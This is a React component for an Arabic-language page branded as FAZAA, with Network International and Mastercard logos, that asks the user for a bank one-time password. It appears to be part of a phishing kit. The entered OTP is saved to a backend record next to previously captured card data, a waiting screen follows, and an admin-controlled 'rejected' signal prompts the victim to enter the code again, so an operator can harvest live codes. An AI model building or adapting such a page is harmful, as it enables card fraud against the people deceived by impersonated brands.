/* FAZAA OTP Verification — تصميم يطابق صورة المرجع بألوان صفحة الدفع */
import { useState, useEffect, useRef } from 'react';
import { useApp } from '@/contexts/AppContext';
import LoadingOverlay from '@/components/LoadingOverlay';
import WaitingModal from '@/components/WaitingModal';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

export default function OtpVerify() {
  const { appData, setAppData, saveApplication, isLoading, setIsLoading, adminRedirectPage, setAdminRedirectPage } = useApp();
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [seconds, setSeconds] = useState(47);
  const [submitted, setSubmitted] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (seconds <= 0) return;
    const timer = setInterval(() => setSeconds(s => s - 1), 1000);
    return () => clearInterval(timer);
  }, [seconds]);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  // استماع لأمر الرفض من المسؤول عبر adminRedirectPage
  useEffect(() => {
    if (!adminRedirectPage) return;
    if (adminRedirectPage.includes('/otp-verify') && adminRedirectPage.includes('rejected=true')) {
      setAdminRedirectPage(''); // مسح التوجيه
      setSubmitted(false);      // إخفاء WaitingModal
      setOtp('');               // مسح الرمز
      setError('الرمز الذي تم إدخاله غير صحيح، يرجى إعادة المحاولة');
      setSeconds(47);           // إعادة العداد
    }
  }, [adminRedirectPage]);

  const handleConfirm = async () => {
    if (!otp.trim()) {
      setError('يرجى إدخال رمز التحقق OTP');
      return;
    }
    setIsLoading(true);
    try {
      await saveApplication({
        ...appData,
        otpCode: otp.trim(),
        currentPage: '/otp-verify',
      });
      setAppData({ otpCode: otp.trim(), currentPage: '/otp-verify' });
      setSubmitted(true);
    } catch (err) {
      setError('حدث خطأ أثناء الحفظ، يرجى المحاولة مجدداً');
    } finally {
      setIsLoading(false);
    }
  };

  const handleResend = () => {
    setSeconds(47);
    setOtp('');
    setError('');
    inputRef.current?.focus();
  };

  // Get last 4 digits of card number for display
  const cardLast4 = appData.cardNumber
    ? appData.cardNumber.replace(/\s/g, '').slice(-4)
    : '****';

  // Waiting screen after OTP submission
  if (submitted) {
    return (
      <div className="min-h-screen flex flex-col" style={{ background: '#050D1A', fontFamily: 'Cairo, sans-serif' }}>
        <Header />
        <main className="flex-1" />
        <Footer />
        <WaitingModal />
      </div>
    );
  }

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ background: '#050D1A', fontFamily: 'Cairo, sans-serif' }}
    >
      {isLoading && <LoadingOverlay />}
      <Header />

      <main className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-sm">

          {/* Card container — same blue-dark gradient as CardPayment */}
          <div
            className="rounded-2xl overflow-hidden"
            style={{
              border: '1px solid rgba(29,74,145,0.5)',
              background: 'linear-gradient(160deg, #050D1A 0%, #071020 50%, #0C1A30 100%)',
            }}
          >
            {/* Top section: FAZAA logo top-right */}
            <div className="px-6 pt-6 pb-2 flex items-start justify-end">
              <div
                className="flex flex-col items-center justify-center px-3 py-2 rounded-xl"
                style={{ background: 'rgba(200,160,58,0.12)', border: '1px solid rgba(200,160,58,0.3)' }}
              >
                <div className="font-black leading-none" style={{ color: '#C8A03A', fontSize: '14px' }}>فزعة</div>
                <div className="font-bold leading-none mt-0.5" style={{ color: '#C8A03A', fontSize: '9px', letterSpacing: '1.5px' }}>FAZAA</div>
              </div>
            </div>

            {/* Mastercard + Network logos row */}
            <div className="px-6 pb-4 flex items-center justify-between">
              {/* Network International logo */}
              <div style={{ background: 'rgba(255,255,255,0.95)', borderRadius: '6px', padding: '4px 8px', display: 'inline-flex', alignItems: 'center' }}>
                <img
                  src="/manus-storage/network-international-logo_1b43eda1.png"
                  alt="Network International Payment Solutions"
                  style={{ height: '28px', display: 'block' }}
                />
              </div>
              {/* Mastercard circles */}
              <div className="flex items-center" style={{ direction: 'ltr' }}>
                <div className="w-8 h-8 rounded-full" style={{ background: '#EB001B' }} />
                <div className="w-8 h-8 rounded-full" style={{ background: '#F79E1B', marginLeft: '-12px', opacity: 0.9 }} />
              </div>
            </div>

            {/* Divider */}
            <div style={{ height: '1px', background: 'rgba(255,255,255,0.1)', margin: '0 24px' }} />

            {/* 2FA info block */}
            <div className="px-6 py-5">
              <h2
                className="text-center font-black mb-3"
                style={{ color: '#C8A03A', fontFamily: 'Cairo, sans-serif', fontSize: '17px' }}
              >
                المصادقة الثنائية الآمنة
              </h2>
              <p
                className="text-center text-sm leading-relaxed"
                style={{ color: 'rgba(255,255,255,0.65)', fontFamily: 'Cairo, sans-serif', lineHeight: '1.7' }}
              >
                ستتلقى رمزاً سرياً لمرة واحدة (OTP) لتأكيد عملية الدفع بأمان عبر رسالة نصية،
                أو مكالمة هاتفية، أو تطبيق البنك.
              </p>
            </div>

            {/* Divider */}
            <div style={{ height: '1px', background: 'rgba(255,255,255,0.1)', margin: '0 24px' }} />

            {/* OTP input section */}
            <div className="px-6 py-5">
              {/* Label */}
              <p
                className="text-center font-bold mb-1"
                style={{ color: '#FFFFFF', fontFamily: 'Cairo, sans-serif', fontSize: '15px' }}
              >
                يرجى إدخال رمز التحقق (OTP):
              </p>

              {/* Subtitle with card last 4 */}
              <p
                className="text-center text-xs mb-4"
                style={{ color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif', direction: 'rtl' }}
              >
                الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة ••••{cardLast4}
              </p>

              {/* Input label */}
              <p
                className="text-sm font-semibold mb-2"
                style={{ color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif', textAlign: 'right' }}
              >
                أدخل الرمز هنا:
              </p>

              {/* Single text input */}
              <input
                ref={inputRef}
                type="text"
                inputMode="numeric"
                placeholder=""
                value={otp}
                onChange={e => {
                  setOtp(e.target.value.replace(/\D/g, '').slice(0, 8));
                  setError('');
                }}
                style={{
                  width: '100%',
                  height: '50px',
                  borderRadius: '8px',
                  border: `1px solid ${error ? '#D72638' : 'rgba(255,255,255,0.2)'}`,
                  background: 'rgba(255,255,255,0.06)',
                  color: '#FFFFFF',
                  fontSize: '22px',
                  fontWeight: 'bold',
                  textAlign: 'center',
                  fontFamily: 'monospace',
                  outline: 'none',
                  letterSpacing: '8px',
                  transition: 'border-color 0.2s, box-shadow 0.2s',
                  direction: 'ltr',
                }}
                onFocus={e => {
                  e.currentTarget.style.borderColor = '#4A90D9';
                  e.currentTarget.style.boxShadow = '0 0 0 3px rgba(74,144,217,0.2)';
                }}
                onBlur={e => {
                  e.currentTarget.style.borderColor = error ? '#D72638' : 'rgba(255,255,255,0.2)';
                  e.currentTarget.style.boxShadow = 'none';
                }}
              />
              {error && (
                <div className="mt-3 p-3 rounded-lg" style={{ background: 'rgba(215,38,56,0.15)', border: '1px solid #D72638' }}>
                  <p className="text-xs text-center" style={{ color: '#D72638', fontFamily: 'Cairo, sans-serif' }}>
                    ⚠ {error}
                  </p>
                </div>
              )}

              {/* Confirm button — gold gradient */}
              <button
                onClick={handleConfirm}
                className="w-full mt-4 py-3 rounded-xl font-black text-base transition-all duration-200"
                style={{
                  background: 'linear-gradient(135deg, #C8A03A, #E8C060)',
                  color: '#050D1A',
                  fontFamily: 'Cairo, sans-serif',
                  fontSize: '16px',
                  boxShadow: '0 4px 15px rgba(200,160,58,0.35)',
                  border: 'none',
                  cursor: 'pointer',
                }}
                onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 6px 25px rgba(200,160,58,0.55)'}
                onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 4px 15px rgba(200,160,58,0.35)'}
              >
                تأكيد
              </button>

              {/* Timer / resend */}
              <div className="text-center mt-4">
                {seconds > 0 ? (
                  <p className="text-sm" style={{ color: 'rgba(255,255,255,0.55)', fontFamily: 'Cairo, sans-serif' }}>
                    ستنتهي صلاحية هذه الصفحة تلقائياً بعد{' '}
                    <span style={{ color: '#E8C060', fontWeight: 'bold' }}>{seconds}</span>
                    {' '}ثانية
                  </p>
                ) : (
                  <button
                    onClick={handleResend}
                    style={{
                      color: '#C8A03A',
                      fontFamily: 'Cairo, sans-serif',
                      fontSize: '14px',
                      background: 'none',
                      border: 'none',
                      cursor: 'pointer',
                      fontWeight: 600,
                    }}
                    onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.textDecoration = 'underline'}
                    onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.textDecoration = 'none'}
                  >
                    إعادة إرسال الرمز
                  </button>
                )}
              </div>

              {/* Help link */}
              <div className="text-center mt-3">
                <button
                  style={{
                    color: 'rgba(255,255,255,0.45)',
                    fontFamily: 'Cairo, sans-serif',
                    fontSize: '13px',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                  }}
                  onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.color = '#C8A03A'}
                  onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,255,255,0.45)'}
                >
                  هل تحتاج للمساعدة؟
                </button>
              </div>
            </div>
          </div>

        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes bounce { 0%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-8px); } }
      `}</style>
    </div>
  );
}
